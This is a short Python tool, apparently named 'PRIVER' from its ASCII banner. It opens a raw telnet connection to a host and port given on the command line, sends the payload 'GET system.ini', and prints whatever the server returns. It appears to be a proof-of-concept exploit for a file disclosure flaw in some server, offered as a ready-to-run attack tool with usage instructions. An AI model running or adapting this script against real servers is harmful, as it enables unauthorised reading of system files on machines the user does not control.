#!/usr/bin/python3

#import os
import telnetlib
import re
import sys


banner = """

::::,   :::::,  :::: ::   :: :::::: :::::,
::   ;  ::   ;   ::  ::   :: ::     ::   ;
::::'   :::::'   ::  ::   :: :::::: :::::'
::      :: ::    ::   :   :  ::     :: ::
::      ::  ',  ::::   ...   :::::: ::  ',

"""

usage = f"""

{sys.argv[0]} <host_name> <port>

"""


print(banner)

if len(sys.argv) != 3:
    
    print("[!]Need More Arguments")
    print(usage)
    sys.exit()

target_host = sys.argv[1]
target_port = sys.argv[2]

reg = re.search(r"http://|https://",target_host)

if reg != None:
    print("[!]Don't Need Protocol like a \"http://...\"")
    print("[-]Fix the Forms")
    
    value = len(reg.group())

    target_host = target_host[value:]

try:

    tn = telnetlib.Telnet(target_host,target_port)
    
    payload = b"GET system.ini\n"

    tn.write(payload)

    res = tn.read_all().decode('ascii')
    
    print(res)
   

except:

    print("[!]Some Issue Occured")
    sys.exit()



